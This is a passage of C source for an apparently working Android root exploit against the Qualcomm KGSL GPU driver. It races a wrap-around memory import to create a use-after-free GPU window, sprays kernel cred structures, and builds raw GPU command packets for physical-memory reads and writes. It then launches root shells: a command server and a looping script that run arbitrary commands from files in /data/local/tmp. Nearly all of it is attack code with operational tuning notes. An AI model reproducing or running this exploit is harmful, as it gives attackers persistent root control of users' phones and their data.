                        for (int sh = 60; sh >= 0; sh -= 4) { int d = (int)((rb >> sh) & 0xf); okm[on++] = (char)((d < 10 ? '0' + d : 'a' + d - 10)); }
                        okm[on++] = '\n';
                        syscall(SYS_write, 1, okm, (long)on);
                    }
                    log_fsync();
                } else { jmp_armed = 0; }
            }
        }
        return;
    }
    /* RD <hex file offset>: read 8 bytes through the phys window. */
    if (line[0] == 'R' && line[1] == 'D' && line[2] == ' ') {
        if (g_lb && g_img_pa) {
            unsigned long off = 0;
            const char *q = line + 3;
            while (*q == ' ') q++;
            while ((*q >= '0' && *q <= '9') || (*q >= 'a' && *q <= 'f') || (*q >= 'A' && *q <= 'F')) {
                int c = (*q >= '0' && *q <= '9') ? (*q - '0') : ((*q | 32) - 'a' + 10);
                off = off * 16 + c; q++;
            }
            if (off < 0x40000000ULL) {
                if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    volatile unsigned long long *rp = (volatile unsigned long long *)
                        (g_lb + (g_img_pa + off - 0x80000000ULL));
                    unsigned long long rv = *rp;
                    jmp_armed = 0;
                    char okm[96]; int on = 0;
                    const char *OM = "[RD] val=0x";
                    for (const char *p2 = OM; *p2; p2++) okm[on++] = *p2;
                    for (int sh = 60; sh >= 0; sh -= 4) { int dg = (int)((rv >> sh) & 0xf); okm[on++] = (char)(dg < 10 ? '0' + dg : 'a' + dg - 10); }
                    okm[on++] = '\n';
                    syscall(SYS_write, 1, okm, (long)on);
                } else { jmp_armed = 0; }
            }
        }
        return;
    }
    long pid = rs2(SYS_clone, 17 /*SIGCHLD*/, 0);
    if (pid < 0) return;
    if (pid == 0) {
        int ofd = (int)rs4(SYS_openat, -100, (long)OUT_PATH,
                           01 | 0100 | 02000, 0666);
        if (ofd >= 0) {
            if (ofd != 1) { rs3(RSC_dup3, ofd, 1, 0); rs1(SYS_close, ofd); }
            rs3(RSC_dup3, 1, 2, 0);
        }
        int dn = (int)rs4(SYS_openat, -100, (long)"/dev/null", 0, 0);
        if (dn >= 0 && dn != 0) { rs3(RSC_dup3, dn, 0, 0); rs1(SYS_close, dn); }
        {
            char *argv[] = { "/system/bin/sh", "-c", line, NULL };
            char *envp[] = {
                "PATH=/system/bin:/system/xbin:/vendor/bin:/sbin:/data/local/tmp",
                "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp",
                "ANDROID_ROOT=/system", NULL };
            rs3(SYS_execve, (long)argv[0], (long)argv, (long)envp);
        }
        rputs(2, "[fifo] exec sh failed\n");
        rs1(RSC_exit_group, 127);
    }
    int st = 0;
    rs2(RSC_wait4, pid, (long)&st);
    if ((st & 0x7f) || (st >> 8)) {
        int o2 = (int)rs4(SYS_openat, -100, (long)OUT_PATH,
                          01 | 0100 | 02000, 0666);
        if (o2 >= 0) {
            rputs(o2, "[fifo] rc=");
            if (st & 0x7f) { rputs(o2, "sig"); rdec(o2, (unsigned long)(st & 0x7f)); }
            else           rdec(o2, (unsigned long)(st >> 8));
            rput(o2, "\n", 1);
            rs1(SYS_close, o2);
        }
    }
}


static void __attribute__((noreturn)) root_fifo_server(void)
{
    static char line[LINE_MAXC];
    /* Leave adbd's cgroup here rather than from main(): main keeps the
       shell SELinux domain (the chain only overrides uid 0), so its write to
       cgroup.procs is denied and it stays under the adbd task. When adbd
       restarts for a USB mode switch its cgroupKill scan no longer finds this
       server. */
    long llen = 0; int ovf = 0;

    rputs(1, "[CMD SRV] entering (regular-file mode)\n");

    /* The command channel is a regular file: mknodat is denied by SELinux in
       the child's context. The server polls by file position for bytes the adb
       side appends; the shipped path runs a single server, so that position
       needs no lock, but a concurrent multi-server path races on it. */
    int cfd = -1;
    long pos = 0;
    rputs(1, "[CMD SRV] ready: echo '<cmd>' >> " CMD_PATH "\n");
    {
        int ofd = (int)rs4(SYS_openat, -100, (long)OUT_PATH,
                           01 | 0100 | 02000, 0666);
        if (ofd >= 0) { rputs(ofd, "--- srv ready\n"); rs1(SYS_close, ofd); }
    }

    /* Report an open failure once: the retry loop would flood the log. */
    static int srv_err_reported = 0;
    for (;;) {
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 300 * 1000 * 1000 };
        rs2(SYS_nanosleep, (long)&ts, 0);
        if (cfd < 0) {
            long r1_ = rs3(SYS_openat, -100, (long)CMD_PATH, 00);
            if (r1_ < 0 && !srv_err_reported) {
                srv_err_reported = 1;
                char em[24]; int en2 = (int)-r1_; int p2 = 23;
                em[p2--] = '\n';
                do { em[p2--] = "0123456789abcdef"[en2 & 15];
                     en2 >>= 4; } while (en2 && p2 > 1);
                em[p2--] = 'x'; em[p2--] = '0'; em[p2] = '-';
                static const char spx[] = "[KDM] srv openat err";
                rput(1, spx, sizeof(spx) - 1);
                rput(1, em + p2, 24 - p2 - 1);
            } else if (r1_ >= 0) cfd = (int)r1_;
            continue;
        }
        char buf[1024];
        long n;
        while ((n = rsys(RSC_pread64, (long)cfd, (long)buf,
                         (long)sizeof(buf), pos, 0, 0)) > 0) {
            pos += n;
            for (long i = 0; i < n; i++) {
                char c = buf[i];
                if (c == '\n' || c == '\r') {
                    if (ovf) { ovf = 0; llen = 0; continue; }
                    long b = 0, e = llen;
                    line[llen] = 0;
                    while (b < e && (line[b]==' '||line[b]=='\t')) b++;
                    while (e > b && (line[e-1]==' '||line[e-1]=='\t')) e--;
                    if (e > b) { line[e] = 0; fifo_run_line(line + b, e - b); }
                    llen = 0;
                } else if (ovf) {
                } else if (llen < LINE_MAXC - 1) {
                    line[llen++] = c;
                } else ovf = 1;
            }
            if (n < (long)sizeof(buf)) {
                long cur = rsys(SYS_lseek, (long)cfd, 0, 1, 0, 0, 0);
                long end = rsys(SYS_lseek, (long)cfd, 0, 2, 0, 0, 0);
                rsys(SYS_lseek, (long)cfd, cur, 0, 0, 0, 0);
                if (end < cur) pos = 0;   /* truncated */
                break;
            }
        }
    }
}

struct burn_arg { int cmd_rfd; int rsp_wfd; int idx; };

static int bc_root_main(void *arg)
{
    /* CLONE_VM shares the fd table, so the parent must not close any end.
       arg points into the child's stack; copy it before use. */
    struct burn_arg ba = *(struct burn_arg *)arg;
    long idx = ba.idx;
    char name[8];
    /* The name carries only idx % 100 while BURN_MAX is 320, so idx and idx-100
       collide: a scan that trusts the two digits wakes the wrong child, and the
       intended one times out and reports 0. */
    name[0]='b'; name[1]='u'; name[2]='r'; name[3]='n';   /* must match the scan constant 0x6E727562 */
    name[4]='0'+(char)((idx%100)/10); name[5]='0'+(char)(idx%10);
    name[6]=0; name[7]=0;
    syscall(SYS_prctl, PR_SET_NAME, (unsigned long)name, 0, 0, 0);
    /* TPIDR_EL0 is 0, so the early path uses raw syscalls and libc signal()
       only becomes safe on the root path. The first byte the parent writes is
       the signal that the patch has landed; the child answers with R. */
    for (;;) {
        char c;
        long r = syscall(SYS_read, (long)ba.cmd_rfd,
                         (unsigned long)&c, 1UL);
        if (r <= 0) {
            struct timespec ts = { .tv_sec = 3600, .tv_nsec = 0 };
            syscall(SYS_nanosleep, &ts, NULL);
            continue;
        }
        if (syscall(SYS_getuid) == 0) {
            /* Drop the dispositions inherited from the parent: its SIGSEGV
               handler siglongjmps into the parent's stack whenever jmp_armed is set,
               and jmpbuf is a CLONE_VM shared global. */
            signal(SIGSEGV, SIG_DFL);
            signal(SIGBUS,  SIG_DFL);
            signal(SIGALRM, SIG_DFL); alarm(0);
            signal(SIGTERM, SIG_IGN);
            signal(SIGINT,  SIG_IGN);
            signal(SIGHUP,  SIG_IGN);
            static const char msg[] = "[+] ROOTED burn-child - exec sh\n";
            syscall(SYS_write, 1, msg, sizeof(msg) - 1);
            syscall(SYS_write, (long)ba.rsp_wfd, "R", 1UL);
            int pf = -1;
            {   /* raw openat, errno on fd1: alive-but-mute vs died-on-arrival */
                long r0 = rsys(SYS_openat, -100,
                    (long)"/data/local/tmp/root_proof.txt",
                    01 | 0100 | 0100000, 0644, 0, 0);
                if (r0 >= 0) {
                    pf = (int)r0;
                    rputs(pf, "ROOTED_BURN_CHILD\n");
                    rs1(SYS_close, pf);
                    pf = 1;   /* sentinel, not a descriptor: the proof was written */
                } else {
                    /* errno as hex on one line: distinguishes live-but-silent from dead */
                    char em[24]; int en2 = (int)-r0; int p2 = 23;
                    em[p2--] = '\n';
                    do { em[p2--] = "0123456789abcdef"[en2 & 15];
                         en2 >>= 4; } while (en2 && p2 > 1);
                    em[p2--] = 'x'; em[p2--] = '0'; em[p2] = '-';
                    static const char pfx[] = "[KDM] proof openat err";
                    syscall(SYS_write, 1, pfx, sizeof(pfx) - 1);
                    syscall(SYS_write, 1, em + p2, 24 - p2 - 1);
                }
            }
            /* Keepalive: root_fifo_server has been seen to die silently after it reports
               ready. A forked child execs a resident shell loop whose fresh image and
               TLS are unaffected by this process's state, and which takes over the
               second command file. */
            {
                long kp = syscall(SYS_clone, 17 /*SIGCHLD*/, 0);
                if (kp == 0) {
                    syscall(SYS_close, (long)ba.cmd_rfd);
                    syscall(SYS_close, (long)ba.rsp_wfd);
                    /* kgsl_fd is not O_CLOEXEC. Left open, this shell holds a
                       reference forever and the release never reaches teardown. */
                    syscall(SYS_close, (long)kgsl_fd);
                    char *argv[] = { "/system/bin/sh", "-c",
                        "while :; do if [ -s /data/local/tmp/rootcmd2 ]; "
                        "then sh /data/local/tmp/rootcmd2 "
                        ">/data/local/tmp/rootout2 2>&1; "
                        ": >/data/local/tmp/rootcmd2; fi; sleep 1; done",
                        NULL };
                    char *envp[] = {
                        "PATH=/system/bin:/system/xbin:/vendor/bin:/sbin:/data/local/tmp",
                        "HOME=/data/local/tmp", "TMPDIR=/data/local/tmp",
                        "ANDROID_ROOT=/system", NULL };
                    syscall(SYS_execve, (long)argv[0], (long)argv, (long)envp);
                    syscall(SYS_exit_group, 126);   /* reached only if execve fails */
                } else if (kp < 0) {
                    /* A failed keepalive clone is the only ENOMEM signal, and f2fs
                       writeback drops log lines, so report it here. */
                    char em[24]; int en2 = (int)-kp; int p2 = 23;
                    em[p2--] = '\n';
                    do { em[p2--] = "0123456789abcdef"[en2 & 15];
                         en2 >>= 4; } while (en2 && p2 > 1);
                    em[p2--] = 'x'; em[p2--] = '0'; em[p2] = '-';
                    static const char kpx[] = "[KDM] keepalive clone err";
                    syscall(SYS_write, 1, kpx, sizeof(kpx) - 1);
                    syscall(SYS_write, 1, em + p2, 24 - p2 - 1);
                } else {
                    /* Do not wait: init reaps the shell, and waitid would block the root path. */
                }
            }
            root_fifo_server();   /* command channel; never returns */
        }
    }
    return 0;
}

/* Short-lived child: swap creds once and exit at once, dropping the reference. */
static int cred_drop_child(void *arg)
{
    (void)arg;
    gid_t g = getgid();
    (void)setresgid(g, g, g);
    syscall(SYS_exit, 0);
    __builtin_unreachable();
}

static void spawn_burn_wave(int want)
{
    for (int i = 0; i < want && n_burn < BURN_MAX; i++) {
        int cmd[2], rsp[2];
        if (pipe(cmd) != 0) break;
        if (pipe(rsp) != 0) { close(cmd[0]); close(cmd[1]); break; }
        void *st = mmap(NULL, 16384, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (st == MAP_FAILED) {
            close(cmd[0]); close(cmd[1]);
            close(rsp[0]); close(rsp[1]);
            break;
        }
        /* args pre-written into the child's stack, visible to it under CLONE_VM */
        struct burn_arg *ba =
            (struct burn_arg *)((char *)st + 16384 - 256);
        ba->cmd_rfd = cmd[0];
        ba->rsp_wfd = rsp[1];
        ba->idx     = n_burn;
        pid_t cpid = clone(bc_root_main, (char *)st + 8192,
                           CLONE_VM | SIGCHLD, ba);
        if (cpid < 0) {
            munmap(st, 16384);
            close(cmd[0]); close(cmd[1]);
            close(rsp[0]); close(rsp[1]);
            break;
        }
        /* Shared fd table: the parent keeps every end open, and each child
           touches only its own pair. */
        burn_cmdw[n_burn] = cmd[1];
        burn_rspr[n_burn] = rsp[0];
        n_burn++;
        usleep(200);     /* a small gap keeps the children adjacent in the task list */
    }
}
/* Wake child idx and wait for it to report root: 1 = rooted, 0 = timed out,
   -1 = unusable (bad index, failed write, poll error, or a dead child, which
   the caller cannot tell apart). The wake byte only says the child was woken;
   the answer is what says it holds root. */
static int burn_confirm(int idx, int timeout_ms)
{
    if (idx < 0 || idx >= n_burn || burn_cmdw[idx] < 0) return -1;
    if (write(burn_cmdw[idx], "W", 1) != 1) return -1;
    struct pollfd p = { .fd = burn_rspr[idx], .events = POLLIN };
    for (int left = timeout_ms; left > 0; ) {
        int pr = poll(&p, 1, left < 50 ? left : 50);
        if (pr < 0) { if (errno == EINTR) continue; return -1; }
        if (pr > 0) {
            char c; ssize_t r = read(burn_rspr[idx], &c, 1);
            if (r == 1 && c == 'R') return 1;
            if (r == 0) return -1;
        }
        left -= 50;
    }
    return 0;
}

static void park_release(void);
/* Parked children each take a fresh cred, which grows cred_jar; at that
   moment the frame is buddy's largest free block, so the new page lands in it.
   The parent's own pop16 then puts its current cred on a frame page, which a
   signature scan can find. */
#define PARK_MAX 1200   /* upper bound; the shipped configuration uses 800 */
static int park_rfd[PARK_MAX], park_wfd[PARK_MAX], n_park = 0;

static void park_release(void);   
static int park_child(void *arg)
{
    struct pollfd p = { .fd = (long)(intptr_t)arg, .events = POLLIN };
    gid_t g = getgid();
    /* Restore SIG_DFL: if the parent left SIG_IGN, alarm() cannot kill this
       child and it would outlive the parent. */
    signal(SIGALRM, SIG_DFL);         /* zombies left by the alarm are never reaped */
    signal(SIGTERM, SIG_IGN); signal(SIGHUP, SIG_IGN);
    alarm(600);   /* 600 s cap; only stops orphans from accumulating */
    (void)setresgid(g, g, g);   /* take a fresh cred and keep it referenced until exit */
    for (;;) {
        int r = poll(&p, 1, 3000);
        if (r > 0) { char c; if (read(p.fd, &c, 1) <= 0) break; }
        else if (r < 0 && errno != EINTR) break;
    }
    syscall(SYS_exit, 0);
    __builtin_unreachable();
}
static void *park_stk = NULL;
/* keep_parked = 0 releases the children; keep_parked = 1 leaves them parked
   for the rest of the run. The PKEY_HIJACK_ONLY path skips this entirely. */
static void cred_burst(int k, int keep_parked)
{
    if (!park_stk)
    /* One up-front reservation for all PARK_MAX child stacks: 18.75 MiB of
       address space, but without MAP_POPULATE only the top page or two of each
       stack is ever resident. */
        park_stk = mmap(NULL, PARK_MAX * 16384, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (park_stk == MAP_FAILED) return;
    int got = 0;
    for (int i = 0; i < k && n_park < PARK_MAX; i++) {
        int pr[2];
        if (pipe(pr) != 0) break;
        /* a shared stack would have concurrent poll() frames overwrite each other */
        char *stk = (char *)park_stk + (size_t)n_park * 16384 + 16384;
        pid_t c = clone(park_child, stk, CLONE_VM | SIGCHLD,
                        (void *)(intptr_t)pr[0]);
        if (c < 0) { close(pr[0]); close(pr[1]); break; }
        park_rfd[n_park] = pr[0]; park_wfd[n_park] = pr[1];
        n_park++; got++;
    }
    gid_t g0 = getgid();
    for (int i = 0; i < 16; i++) (void)setresgid(g0, g0, g0);  /* parent pops cred_jar to its newest slot */
    L("[BURST] parked %d children + parent pop16 (cred_jar new page <- window frame) keep=%d\n",
      got, keep_parked);
    log_fsync();
    if (!keep_parked) park_release();
}
static void park_release(void)
{
    for (int i = 0; i < n_park; i++) close(park_wfd[i]);
    n_park = 0;
    /* Reap whatever the alarms already killed (20 x 50 ms), so zombies do not
       fill the task_struct slab. Nothing is killed here. */
    for (int w = 0; w < 20; w++) {   
        if (waitpid(-1, NULL, WNOHANG) <= 0) usleep(50000);
    }
}


/* ============ kgsl UAPI (per include/uapi/linux/msm_kgsl.h) ============ */
#define KGSL_IOC_TYPE 0x09
#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_MEMFLAGS_USERMEM_ADDR ((2 + 1) << 5)   /* unused; this chain uses type = KGSL_USER_MEM_TYPE_ADDR */
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2

struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; uint32_t id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; uint32_t id; };
struct kgsl_gpuobj_free { uint64_t flags, priv; uint32_t id, type, len; };
struct kgsl_gpuobj_import { uint64_t priv, priv_len, flags; uint32_t type, id; };
struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
struct kgsl_gpuobj_set_info { uint64_t flags; uint64_t metadata; uint32_t id; uint32_t metadata_len; uint32_t type; uint64_t __pad; };   /* kernel side: flags u64 at +0, metadata u64 at +8, id at +16; a u32 flags here puts id in the wrong slot and always yields EINVAL */
/* Wait for a submitted timestamp to retire: retire is the CP_EVENT_WRITE
   CACHE_FLUSH_TS the kernel appends to every submit, i.e. the GPU L2 flush
   has completed. A real synchronisation point, unlike sleeping. */
struct kgsl_device_waittimestamp_ctxtid {
    unsigned int context_id;
    unsigned int timestamp;
    unsigned int timeout;
};
#define IOCTL_KGSL_DEVICE_WAITTIMESTAMP_CTXTID _IOW(KGSL_IOC_TYPE, 0x7, struct kgsl_device_waittimestamp_ctxtid)
/* Failure modes. (1) No synchronisation: the CPU can sample before the GPU
   runs, and scan_window_readonly's slot decoder continues rather than faulting on a
   non-contiguous slot, so a self-consistent page of fabricated data reads as
   a real hit. (2) Wrong timestamp: ts must come from this thread's own
   submit, because last_submit_ts is per-thread and the heartbeat thread's
   submit does not update it; waiting on a stale or initial value
   synchronises nothing. errno on -1 says which. */
static int wait_submit_retire(uint32_t ctx, uint32_t ts)
{
    struct kgsl_device_waittimestamp_ctxtid w = { .context_id = ctx, .timestamp = ts, .timeout = 2000 };
    return ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_WAITTIMESTAMP_CTXTID, &w);
}
struct kgsl_drawctxt_create { uint32_t flags; uint32_t drawctxt_id; };
struct kgsl_ibdesc { uint64_t gpuaddr; uint64_t __pad; uint64_t sizedwords; uint32_t ctrl; };
struct kgsl_submit_commands { uint32_t context_id; uint32_t flags; void *cmdlist; uint32_t numcmds; void *synclist; uint32_t numsyncs; uint32_t timestamp; uint32_t __pad[4]; };
struct kgsl_gpuobj_sync_obj { uint64_t offset, length; uint32_t id, op; };
struct kgsl_gpuobj_sync { uint64_t objs; uint32_t obj_len, count; };

#define IOCTL_KGSL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE   _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
#define IOCTL_KGSL_GPUOBJ_SYNC   _IOW(KGSL_IOC_TYPE, 0x49, struct kgsl_gpuobj_sync)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_SUBMIT_COMMANDS _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_submit_commands)

#define KGSL_GPUMEM_CACHE_CLEAN 1
#define KGSL_GPUMEM_CACHE_INV   2

/* ============ Geometry constants ============ */
#define HOSTPTR        0x7001ff000UL   /* Deliberately 4 KB below a 2 MB boundary: if A.base were 2 MB
                                          aligned, OVERLAP would align to the same PTE table, miss the
                                          hole, and unmap would not fail on its first block. */
#define UAF_SIZE       0x10004000UL    /* 256 MiB + 16 KiB: the dangling window frame */
#define BOGUS_ADDR     (HOSTPTR + 0x5000)   /* Must not equal HOSTPTR: a virtaddr that collides
                                               with A.base takes the duplicate-region
                                               comparison and is rejected. */
#define BOGUS_PRIVLEN  0xffffffffffefd000ULL           /* large enough that gpuaddr + size overflows and passes the range check */
#define OVER_ADDR      (HOSTPTR - 0x1000)   /* The OVERLAP object covers A's first 6 pages, and only
                                               for that: _iommu_unmap in FREE(A) returns -ENODEV only
                                               on a missing PTE in the first block. */
#define OVER_SIZE      0x7000               /* 0x1000 prefix page plus A's first 5 pages */
#define PLACE_SIZE     0x10400000UL   /* PLACE anchor: a second kgsl pool (UNMOVABLE) object that exists before
                                         the race and is held for the whole run. It must enter the rbtree before
                                         the wrap import of step 4, so the transient region the race inserts does
                                         not change the tree shape. The size is 260 MiB; 0x10400000 is hex, not
                                         104 MB. */
#define PLACE_ADDR     (HOSTPTR + 0x10005000)  /* Starts exactly where the dangling window ends, [HOSTPTR+0x1000,
                                                  HOSTPTR+0x10005000): PLACE must sort after A, or the
                                                  rbtree order the precondition needs does not hold. */
#define DANGLING_BASE  (HOSTPTR + 0x1000)              /* the race has already removed the first PTE; the dangling range starts here */
#define DANGLING_PAGES ((UAF_SIZE >> 12) - 1)
        /* One less than the page count of UAF_SIZE: the PTE at DANGLING_BASE has
           already been removed by the race. */


/* Markers cover both ends of the dangling range: the free path returns pages in
   order, so the last page is at the LIFO head and the first is reclaimed last. */
#define MARKER_HI_CNT  256             /* the last 256 pages of the dangling range, tagged 0xCAFE0100 | i */
#define MARKER_OFF     0x800           /* written at +0x800, a different cache line from the spray tag at +0x00 */

static volatile int stop_racing;
static int race_iters = 4000;   /* Bound on OVERLAP mmap attempts in the inner loop. main()
                                   unconditionally overwrites it from argv[3] (default 20000) before
                                   the race, so this value never reaches the loop. */


static int gpuobj_alloc(uint64_t size, uint64_t flags, uint32_t *id)
{
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags, .va_len = 0,
        .mmapsize = 0, .id = 0, .metadata_len = 0, .metadata = 0 };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a);
    if (r == 0 && id) *id = a.id;
    return r;
}

/* GPUOBJ_INFO echoes back the size; the ioctl does not validate it. */
static int gpuobj_info_size(uint32_t id, uint64_t *size)
{
    struct kgsl_gpuobj_info info = { .id = id };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    if (r == 0 && size) *size = info.size;
    return r;
}

static int gpuobj_info(uint32_t id, uint64_t *gpuaddr)
{
    struct kgsl_gpuobj_info gi = { .id = id };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &gi);
    if (r == 0 && gpuaddr) *gpuaddr = gi.gpuaddr;
    return r;
}
static int gpuobj_free(uint32_t id)
{
    struct kgsl_gpuobj_free f = { .flags = 0, .priv = 0, .id = id, .type = 0, .len = 0 };
    errno = 0;
    return ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
}
static int gpuobj_sync(uint32_t id, uint64_t off, uint64_t len, uint32_t op)
{
    struct kgsl_gpuobj_sync_obj o = { .offset = off, .length = len, .id = id, .op = op };
    struct kgsl_gpuobj_sync s = { .objs = (uint64_t)(uintptr_t)&o, .obj_len = sizeof(o), .count = 1 };
    errno = 0;
    return ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_SYNC, &s);
}


/* SET_INFO(TYPE) is no longer used. Reinstating it would poison our own
   measurements: the kernel RMWs flags at +0x50, which shares a cache line with
   ops at +0x48, so a line the storm evicted to DRAM comes back refilled with
   the GPU's values. */
/* gpuobj_import_addr: GPUOBJ_IMPORT with type = KGSL_USER_MEM_TYPE_ADDR
   dispatches to kgsl_setup_anon_useraddr, whose gup pins our anonymous pages;
   the backing comes from our own mapping, not from kgsl. Both callers expect
   failure: bogus_thread uses BOGUS_PRIVLEN to wrap gpuaddr + size and open the
   hole, which needs the one-page anon VMA from step 3 so find_vma can resolve
   BOGUS_ADDR, and the step 6 discriminator re-imports the same hostptr. */


static int gpuobj_import_addr(uint64_t hostptr, uint64_t len, uint64_t flags, uint32_t *id)
{
    struct kgsl_gpuobj_import_useraddr ua = { .virtaddr = hostptr };
    struct kgsl_gpuobj_import imp = { .priv = (uint64_t)(uintptr_t)&ua, .priv_len = len,
        .flags = flags, .type = KGSL_USER_MEM_TYPE_ADDR, .id = 0 };
    errno = 0;
    int r = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    if (r == 0 && id) *id = imp.id;
    return r;
}

/* ============ A6xx CP type7 packets (per adreno_pm4types.h) ============ */
static int cp_nop(uint32_t *d, uint32_t id) { d[0] = 0x70100001; d[1] = id; return 2; }
/* CP_MEM_WRITE (0x3D): the GPU write primitive. Writing a dangling page
   requires 0x3D; MEMCPY 0x75 does not take effect there. */
static int cp_mem_write(uint32_t *d, uint64_t gpuaddr, uint32_t value)
{
    d[0] = 0x703D8003; d[1] = (uint32_t)gpuaddr; d[2] = (uint32_t)(gpuaddr >> 32); d[3] = value;
    return 4;
}

/* 64-bit value write packet. The 32-bit header of a type7 packet is
   cp_type7_packet(op, cnt) = 0x70000000 | cnt | parity(cnt)<<15 | op<<16 |
   parity(op)<<23: bits 0-14 count, bits 16-22 op. Only bit15 has been
   verified on device, and its direction is the opposite of the textbook:
   every header seen fits parity(x) = 1 ^ (popcount(x) & 1), i.e. the bit is
   set when the popcount is even. So cp_mem_write() emits 0x703D8003 and
   cp_mem_write64() emits 0x703D0004. bit23 is unverified and must not be
   inferred from that rule, which fails for op=0x92 in cp_wait_mem_writes.
   A wrong parity bit makes firmware drop the packet: the IB does not
   execute and every later submit faults. */
static int cp_mem_write64(uint32_t *d, uint64_t gpuaddr, uint64_t value)
{
    d[0] = 0x703D0004; d[1] = (uint32_t)gpuaddr; d[2] = (uint32_t)(gpuaddr >> 32);
    d[3] = (uint32_t)value; d[4] = (uint32_t)(value >> 32);
    return 5;
}
static int cp_wait_mem_writes(uint32_t *d) { d[0] = 0x70928000; return 1; }
/* CP_MEMCPY (0x75, A6xx and earlier): the GPU read primitive */
static int cp_memcpy(uint32_t *d, uint32_t nwords, uint64_t src, uint64_t dst)
{
    /* CP_MEMCPY (opcode 0x75, 5 payload dwords): count=5 parity bit15=1. */
    d[0] = 0x70758005;
    d[1] = nwords;
    d[2] = (uint32_t)src; d[3] = (uint32_t)(src >> 32);
    d[4] = (uint32_t)dst; d[5] = (uint32_t)(dst >> 32);
    return 6;
}
/* CP_MEM_TO_MEM (type-7 opcode 0x73): control=0, dst GPU VA, src GPU VA. */
static int cp_mem_to_mem(uint32_t *d, uint64_t src, uint64_t dst)
{
    d[0] = 0x70738005;
    d[1] = 0;
    d[2] = (uint32_t)dst; d[3] = (uint32_t)(dst >> 32);
    d[4] = (uint32_t)src; d[5] = (uint32_t)(src >> 32);
    return 6;
}

/* ============ Race: wrap import, the hole maker ============
   BOGUS import: virtaddr = BOGUS_ADDR with priv_len = BOGUS_PRIVLEN makes
   set_svm_region's gpuaddr + size wrap past iommu_addr_in_svm_ranges, so an
   inverted transient SVM region is inserted into the rbtree. kvcalloc(2^36)
   then fails slowly, and the failure path's put_gpuaddr tears that region down -
   the window in which A's first PTE gets removed. */
static void *bogus_thread(void *arg)
{
    (void)arg;
    /* Repeats an import the kernel must reject but that walks the full wrap path.
       priv_len has to be large enough to wrap past 2^64, or the range check
       rejects it outright. The struct is built by hand rather than through
       gpuobj_import_addr() only so the single ioctl can be timed on its own. */
    struct kgsl_gpuobj_import_useraddr ua = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = { .priv = (uint64_t)(uintptr_t)&ua,
        .priv_len = BOGUS_PRIVLEN, .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR, .id = 0 };
    int first_err = 0, n_err = 0;
    long long first_dt_us = -1;
    while (!stop_racing) {
        errno = 0;
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        int r = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
        clock_gettime(CLOCK_MONOTONIC, &t1);
        long long dt = (t1.tv_sec - t0.tv_sec) * 1000000LL + (t1.tv_nsec - t0.tv_nsec) / 1000;
        if (first_err == 0 && r != 0) {
            first_err = errno; first_dt_us = dt;
            L("[D] bogus import first error errno=%d dt=%lldus\n", errno, dt);
        }
        if (r != 0) n_err++;
    }
    L("[D] bogus_thread done: %d errors total (first errno=%d dt=%lldus)\n", n_err, first_err, first_dt_us);
    return NULL;
}

/* ============ Diagnostics: meminfo ============
   MemAvailable is free + reclaimable, so evicting page cache alone lowers it;
   MemFree is printed beside it. poolProxy = KReclaimable - SReclaimable measures
   slab, but the frame is a buddy allocation - only the spray hit rate says
   whether the frame survived. */
static void mem_diag(const char *label)
{
    FILE *f = fopen("/proc/meminfo", "r");
    char line[128];
    uint64_t free_kb = 0, cached_kb = 0, avail_kb = 0, swap_kb = 0, krecl = 0, srecl = 0;
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemFree: %llu kB", (unsigned long long *)&free_kb) == 1) continue;
            if (sscanf(line, "Cached: %llu kB", (unsigned long long *)&cached_kb) == 1) continue;
            if (sscanf(line, "MemAvailable: %llu kB", (unsigned long long *)&avail_kb) == 1) continue;
            if (sscanf(line, "SwapFree: %llu kB", (unsigned long long *)&swap_kb) == 1) continue;
            if (sscanf(line, "KReclaimable: %llu kB", (unsigned long long *)&krecl) == 1) continue;
            if (sscanf(line, "SReclaimable: %llu kB", (unsigned long long *)&srecl) == 1) continue;
        }
        fclose(f);
    }
    L("[D] %s: avail=%lluMB MemFree=%lluMB Cached=%lluMB SwapFree=%lluMB KReclaimable=%lluMB poolProxy=%lldMB\n", label,
        (unsigned long long)(avail_kb / 1024), (unsigned long long)(free_kb / 1024),
